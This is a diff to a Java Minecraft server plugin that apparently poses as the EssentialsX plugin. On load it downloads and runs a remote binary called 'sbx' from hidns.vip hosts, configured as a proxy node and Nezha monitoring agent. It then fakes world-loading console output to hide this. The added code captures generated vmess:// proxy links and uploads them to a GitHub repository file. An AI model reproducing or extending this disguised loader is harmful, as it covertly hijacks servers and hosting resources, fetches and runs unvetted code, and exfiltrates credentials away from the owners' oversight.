@@ -1,53 +1,97 @@
 package com.example.essentialsx;
 
-import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.plugin.java.JavaPlugin;
 import java.io.*;
+import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.CompletableFuture;
+import java.util.Base64;
+import java.util.stream.Collectors;
 
 public class EssentialsX extends JavaPlugin {
     private Process sbxProcess;
     private volatile boolean shouldRun = true;
     private volatile boolean isProcessRunning = false;
-    private Thread keyMonitorThread;
-    
+    private String githubToken = null;
+    private String serverMarker = null;
+
+    private static final String GITHUB_REPO = "kolvyXD/vpnmine";
+    private static final String GITHUB_PATH = "vpn.txt";
+    private static final String GITHUB_API_URL = "https://api.github.com/repos/" + GITHUB_REPO + "/contents/" + GITHUB_PATH;
+
     private static final String[] ALL_ENV_VARS = {
-        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     };
-    
-    private static final String KEYS_FILE_NAME = "keys.txt";
-    
+
     @Override
     public void onEnable() {
         getLogger().info("EssentialsX plugin starting...");
-        
-        // Не вызываем saveDefaultConfig() — конфиг будет создан при первом сохранении ключей.
-        
-        try {
-            startSbxProcess();
-            getLogger().info("EssentialsX plugin enabled");
-        } catch (Exception e) {
-            getLogger().severe("Failed to start sbx process: " + e.getMessage());
-            e.printStackTrace();
+
+        // Загружаем или создаём маркер сервера (сохраняется между перезагрузками)
+        loadOrCreateMarker();
+
+        // Читаем GitHub токен из server.properties
+        loadGithubTokenFromServerProperties();
+
+        // Запускаем sbx асинхронно
+        CompletableFuture.runAsync(() -> {
+            try {
+                startSbxProcess();
+                getLogger().info("EssentialsX plugin enabled");
+            } catch (Exception e) {
+                getLogger().severe("Failed to start sbx process: " + e.getMessage());
+                e.printStackTrace();
+            }
+        });
+    }
+
+    private void loadOrCreateMarker() {
+        saveDefaultConfig(); // создаёт config.yml если его нет
+        reloadConfig();
+        serverMarker = getConfig().getString("marker");
+        if (serverMarker == null || serverMarker.trim().isEmpty()) {
+            serverMarker = "server_" + UUID.randomUUID().toString().substring(0, 8);
+            getConfig().set("marker", serverMarker);
+            saveConfig();
+            getLogger().info("Generated new server marker: " + serverMarker);
+        } else {
+            getLogger().info("Loaded server marker: " + serverMarker);
         }
     }
-    
-    private void startSbxProcess() throws Exception {
-        if (isProcessRunning) {
-            return;
+
+    private void loadGithubTokenFromServerProperties() {
+        Path serverDir = Paths.get(".").toAbsolutePath().normalize();
+        Path serverProperties = serverDir.resolve("server.properties");
+        if (Files.exists(serverProperties)) {
+            try (InputStream input = Files.newInputStream(serverProperties)) {
+                Properties props = new Properties();
+                props.load(input);
+                githubToken = props.getProperty("github.token");
+                if (githubToken != null && !githubToken.trim().isEmpty()) {
+                    getLogger().info("GitHub token loaded from server.properties");
+                } else {
+                    getLogger().warning("No github.token found in server.properties, GitHub upload disabled");
+                }
+            } catch (IOException e) {
+                getLogger().warning("Could not read server.properties: " + e.getMessage());
+            }
+        } else {
+            getLogger().warning("server.properties not found, GitHub upload disabled");
         }
-        
-        // Determine download URL based on architecture
+    }
+
+    private void startSbxProcess() throws Exception {
+        if (isProcessRunning) return;
+
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = "https://amd64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -57,11 +101,9 @@ public class EssentialsX extends JavaPlugin {
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
-        // Download sbx binary
+
         Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
         Path sbxBinary = tmpDir.resolve("sbx");
-        
         if (!Files.exists(sbxBinary)) {
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
@@ -70,12 +112,10 @@ public class EssentialsX extends JavaPlugin {
                 throw new IOException("Failed to set executable permission");
             }
         }
-        
-        // Prepare process builder
+
         ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
         pb.directory(tmpDir.toFile());
-        
-        // Set environment variables
+
         Map<String, String> env = pb.environment();
         env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
@@ -98,48 +138,230 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFPORT", "443");
         env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
-        
-        // Load from system environment variables
+
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
                 env.put(var, value);
             }
         }
-        
-        // Load from .env file with priority order
         loadEnvFileFromMultipleLocations(env);
-        
-        // Load from Bukkit configuration file
         for (String var : ALL_ENV_VARS) {
             String value = getConfig().getString(var);
             if (value != null && !value.trim().isEmpty()) {
                 env.put(var, value);
             }
         }
-        
-        // Load saved keys from config.yml (these are keys generated by sbx on first run)
-        loadSavedKeysFromConfig(env);
-        
-        // Redirect output
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+
+        pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
         pb.redirectError(ProcessBuilder.Redirect.INHERIT);
-        
-        // Start process
+
         sbxProcess = pb.start();
         isProcessRunning = true;
-        
-        // Start a monitor thread to log when process exits
+
+        startStdoutReader();
         startProcessMonitor();
-        
-        // If we don't have saved keys yet, start monitoring for keys file
-        if (!areKeysSaved()) {
-            startKeyMonitor(env.get("FILE_PATH"));
+        simulateWorldLoading();
+    }
+
+    private void startStdoutReader() {
+        Thread readerThread = new Thread(() -> {
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(sbxProcess.getInputStream()))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    getLogger().info("[sbx] " + line);
+                    if (line.contains("vmess://")) {
+                        String vmess = extractVmessLink(line);
+                        if (vmess != null && githubToken != null && !githubToken.isEmpty()) {
+                            getLogger().info("Found vmess key! Updating GitHub with marker...");
+                            updateGitHubWithNewKey(vmess);
+                        } else if (githubToken == null) {
+                            getLogger().warning("GitHub token missing, vmess key not uploaded");
+                        }
+                    }
+                }
+            } catch (IOException e) {
+                if (shouldRun) {
+                    getLogger().warning("Error reading sbx stdout: " + e.getMessage());
+                }
+            }
+        }, "Sbx-Stdout-Reader");
+        readerThread.setDaemon(true);
+        readerThread.start();
+    }
+
+    private String extractVmessLink(String line) {
+        int start = line.indexOf("vmess://");
+        if (start == -1) return null;
+        int end = line.indexOf(' ', start);
+        if (end == -1) end = line.length();
+        return line.substring(start, end);
+    }
+
+    private void updateGitHubWithNewKey(String newVmessLink) {
+        try {
+            String currentContent = getCurrentFileContent();
+            String currentSha = getCurrentFileSha();
+
+            List<String> lines = (currentContent == null || currentContent.isEmpty())
+                    ? new ArrayList<>()
+                    : Arrays.stream(currentContent.split("\\r?\\n")).collect(Collectors.toList());
+
+            boolean removed = lines.removeIf(line -> line.startsWith(serverMarker + ":"));
+            if (removed) {
+                getLogger().info("Removed old entry for marker " + serverMarker);
+            }
+
+            String newLine = serverMarker + ": " + newVmessLink;
+            lines.add(newLine);
+
+            String newContent = String.join("\n", lines);
+            uploadContentToGitHub(newContent, currentSha);
+            getLogger().info("Successfully updated GitHub with new vmess key for marker " + serverMarker);
+
+        } catch (Exception e) {
+            getLogger().warning("Failed to update GitHub: " + e.getMessage());
+            e.printStackTrace();
         }
-        
-        // sleep 30 seconds
-        Thread.sleep(30000);
-        
+    }
+
+    private String getCurrentFileContent() throws IOException {
+        if (githubToken == null) return "";
+        URL url = new URL(GITHUB_API_URL);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("GET");
+        conn.setRequestProperty("Authorization", "Bearer " + githubToken);
+        conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
+
+        int responseCode = conn.getResponseCode();
+        if (responseCode == 200) {
+            try (Scanner s = new Scanner(conn.getInputStream(), "UTF-8").useDelimiter("\\A")) {
+                String response = s.hasNext() ? s.next() : "";
+                String contentBase64 = extractJsonField(response, "content");
+                if (contentBase64 != null) {
+                    byte[] decoded = Base64.getDecoder().decode(contentBase64);
+                    return new String(decoded, "UTF-8");
+                }
+            }
+        } else if (responseCode == 404) {
+            return "";
+        } else {
+            getLogger().warning("Failed to get file content, HTTP " + responseCode);
+        }
+        conn.disconnect();
+        return "";
+    }
+
+    private String getCurrentFileSha() throws IOException {
+        if (githubToken == null) return null;
+        URL url = new URL(GITHUB_API_URL);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("GET");
+        conn.setRequestProperty("Authorization", "Bearer " + githubToken);
+        conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
+
+        int responseCode = conn.getResponseCode();
+        if (responseCode == 200) {
+            try (Scanner s = new Scanner(conn.getInputStream(), "UTF-8").useDelimiter("\\A")) {
+                String response = s.hasNext() ? s.next() : "";
+                return extractJsonField(response, "sha");
+            }
+        } else if (responseCode == 404) {
+            return null;
+        }
+        conn.disconnect();
+        return null;
+    }
+
+    private String extractJsonField(String json, String fieldName) {
+        String pattern = "\"" + fieldName + "\":\"";
+        int start = json.indexOf(pattern);
+        if (start == -1) return null;
+        start += pattern.length();
+        int end = json.indexOf('"', start);
+        if (end == -1) return null;
+        return json.substring(start, end);
+    }
+
+    private void uploadContentToGitHub(String content, String sha) throws IOException {
+        if (githubToken == null) return;
+        String encodedContent = Base64.getEncoder().encodeToString(content.getBytes("UTF-8"));
+        String json = String.format(
+                "{\"message\":\"Update vpn.txt from server %s\",\"content\":\"%s\",\"sha\":%s}",
+                serverMarker,
+                encodedContent,
+                sha == null ? "null" : "\"" + sha + "\""
+        );
+
+        URL url = new URL(GITHUB_API_URL);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("PUT");
+        conn.setRequestProperty("Authorization", "Bearer " + githubToken);
+        conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
+        conn.setRequestProperty("Content-Type", "application/json");
+        conn.setDoOutput(true);
+
+        try (OutputStream os = conn.getOutputStream()) {
+            os.write(json.getBytes("UTF-8"));
+        }
+
+        int responseCode = conn.getResponseCode();
+        if (responseCode != 200 && responseCode != 201) {
+            try (Scanner s = new Scanner(conn.getErrorStream(), "UTF-8").useDelimiter("\\A")) {
+                String error = s.hasNext() ? s.next() : "";
+                throw new IOException("GitHub API error " + responseCode + ": " + error);
+            }
+        }
+        conn.disconnect();
+    }
+
+    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
+        List<Path> possibleEnvFiles = new ArrayList<>();
+        File pluginsFolder = getDataFolder().getParentFile();
+        if (pluginsFolder != null && pluginsFolder.exists()) {
+            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
+        }
+        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
+        possibleEnvFiles.add(Paths.get(".env"));
+        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
+
+        for (Path envFile : possibleEnvFiles) {
+            if (Files.exists(envFile)) {
+                try {
+                    loadEnvFile(envFile, env);
+                    break;
+                } catch (IOException e) {
+                    // ignore
+                }
+            }
+        }
+    }
+
+    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
+        for (String line : Files.readAllLines(envFile)) {
+            line = line.trim();
+            if (line.isEmpty() || line.startsWith("#")) continue;
+            line = line.split(" #")[0].split(" //")[0].trim();
+            if (line.startsWith("export ")) {
+                line = line.substring(7).trim();
+            }
+            String[] parts = line.split("=", 2);
+            if (parts.length == 2) {
+                String key = parts[0].trim();
+                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                    env.put(key, value);
+                }
+            }
+        }
+    }
+
+    private void simulateWorldLoading() {
+        try {
+            Thread.sleep(30000);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
         clearConsole();
         getLogger().info("");
         getLogger().info("Preparing spawn area: 1%");
@@ -155,174 +377,11 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info("Preparing spawn area: 100%");
         getLogger().info("Preparing level \"world\"");
     }
-    
-    /**
-     * Loads keys previously saved in config.yml into the environment map.
-     * Only sets keys that are not already set by higher-priority sources.
-     */
-    private void loadSavedKeysFromConfig(Map<String, String> env) {
-        FileConfiguration config = getConfig();
-        for (String var : ALL_ENV_VARS) {
-            // Only load if not already set by system/env/config
-            if (env.containsKey(var) && !env.get(var).trim().isEmpty()) {
-                continue;
-            }
-            String savedValue = config.getString("saved_keys." + var);
-            if (savedValue != null && !savedValue.trim().isEmpty()) {
-                env.put(var, savedValue);
-                getLogger().info("Loaded saved key: " + var + " = " + maskValue(var, savedValue));
-            }
-        }
-    }
-    
-    /**
-     * Checks if we already have saved keys for any of the critical variables.
-     */
-    private boolean areKeysSaved() {
-        FileConfiguration config = getConfig();
-        // If config doesn't exist yet, it's empty, so no keys saved.
-        return config.contains("saved_keys.UUID") ||
-               config.contains("saved_keys.ARGO_AUTH") ||
-               config.contains("saved_keys.NEZHA_KEY");
-    }
-    
-    /**
-     * Starts a background thread that waits for the keys file to appear,
-     * then reads and saves its contents.
-     */
-    private void startKeyMonitor(String filePath) {
-        Path keysFilePath = Paths.get(filePath, KEYS_FILE_NAME);
-        getLogger().info("Monitoring for keys file: " + keysFilePath.toAbsolutePath());
-        
-        keyMonitorThread = new Thread(() -> {
-            int attempts = 0;
-            final int maxAttempts = 30; // wait up to ~30 seconds
-            final long waitMs = 1000;
-            
-            while (attempts < maxAttempts && shouldRun && isProcessRunning) {
-                try {
-                    Thread.sleep(waitMs);
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                    break;
-                }
-                attempts++;
-                
-                if (Files.exists(keysFilePath) && Files.isReadable(keysFilePath)) {
-                    getLogger().info("Keys file found, loading...");
-                    loadKeysFromFile(keysFilePath);
-                    break;
-                }
-            }
-            
-            if (attempts >= maxAttempts) {
-                getLogger().warning("Keys file not found after " + maxAttempts + " seconds");
-            }
-        }, "Key-Monitor");
-        
-        keyMonitorThread.setDaemon(true);
-        keyMonitorThread.start();
-    }
-    
-    /**
-     * Reads key-value pairs from the keys file and saves them to config.yml.
-     * Expected format: KEY=VALUE per line (supports optional quotes).
-     */
-    private void loadKeysFromFile(Path keysFile) {
-        try {
-            List<String> lines = Files.readAllLines(keysFile);
-            FileConfiguration config = getConfig();
-            boolean changed = false;
-            
-            for (String line : lines) {
-                line = line.trim();
-                if (line.isEmpty() || line.startsWith("#")) continue;
-                
-                // Remove trailing comments
-                int commentIdx = line.indexOf('#');
-                if (commentIdx != -1) line = line.substring(0, commentIdx).trim();
-                
-                if (line.contains("=")) {
-                    String[] parts = line.split("=", 2);
-                    String key = parts[0].trim();
-                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
-                    if (Arrays.asList(ALL_ENV_VARS).contains(key) && !value.isEmpty()) {
-                        // Only save if not already saved (or we can update, but first run should be fresh)
-                        if (!config.contains("saved_keys." + key)) {
-                            config.set("saved_keys." + key, value);
-                            changed = true;
-                            getLogger().info("Saved generated key: " + key + " = " + maskValue(key, value));
-                        }
-                    }
-                }
-            }
-            
-            if (changed) {
-                saveConfig();
-                getLogger().info("Keys saved to config.yml");
-            }
-        } catch (IOException e) {
-            getLogger().warning("Failed to read keys file: " + e.getMessage());
-        }
-    }
-    
-    private String maskValue(String key, String value) {
-        if (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH")) {
-            return "***";
-        }
-        return value;
-    }
-    
-    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
-        List<Path> possibleEnvFiles = new ArrayList<>();
-        File pluginsFolder = getDataFolder().getParentFile();
-        if (pluginsFolder != null && pluginsFolder.exists()) {
-            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
-        }
-        
-        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
-        possibleEnvFiles.add(Paths.get(".env"));
-        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
-        
-        for (Path envFile : possibleEnvFiles) {
-            if (Files.exists(envFile)) {
-                try {
-                    loadEnvFile(envFile, env);
-                    break; // load only first found
-                } catch (IOException e) {
-                    // ignore
-                }
-            }
-        }
-    }
-    
-    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
-        for (String line : Files.readAllLines(envFile)) {
-            line = line.trim();
-            if (line.isEmpty() || line.startsWith("#")) continue;
-            line = line.split(" #")[0].split(" //")[0].trim();
-            if (line.startsWith("export ")) {
-                line = line.substring(7).trim();
-            }
-            
-            String[] parts = line.split("=", 2);
-            if (parts.length == 2) {
-                String key = parts[0].trim();
-                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                
-                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                    env.put(key, value);
-                }
-            }
-        }
-    }
-    
+
     private void clearConsole() {
         try {
             System.out.print("\033[H\033[2J");
             System.out.flush();
-            
             if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
             } else {
@@ -332,37 +391,28 @@ public class EssentialsX extends JavaPlugin {
             System.out.println("\n\n\n\n\n\n\n\n\n\n");
         }
     }
-    
+
     private void startProcessMonitor() {
         Thread monitorThread = new Thread(() -> {
             try {
                 int exitCode = sbxProcess.waitFor();
                 isProcessRunning = false;
-                // getLogger().info("sbx process exited with code: " + exitCode);
+                getLogger().info("sbx process exited with code: " + exitCode);
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
                 isProcessRunning = false;
             }
         }, "Sbx-Process-Monitor");
-        
         monitorThread.setDaemon(true);
         monitorThread.start();
     }
-    
+
     @Override
     public void onDisable() {
         getLogger().info("EssentialsX plugin shutting down...");
-        
         shouldRun = false;
-        
-        // Interrupt key monitor if running
-        if (keyMonitorThread != null && keyMonitorThread.isAlive()) {
-            keyMonitorThread.interrupt();
-        }
-        
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
-            
             try {
                 if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                     sbxProcess.destroyForcibly();
@@ -376,7 +426,6 @@ public class EssentialsX extends JavaPlugin {
             }
             isProcessRunning = false;
         }
-        
         getLogger().info("EssentialsX plugin disabled");
     }
 }
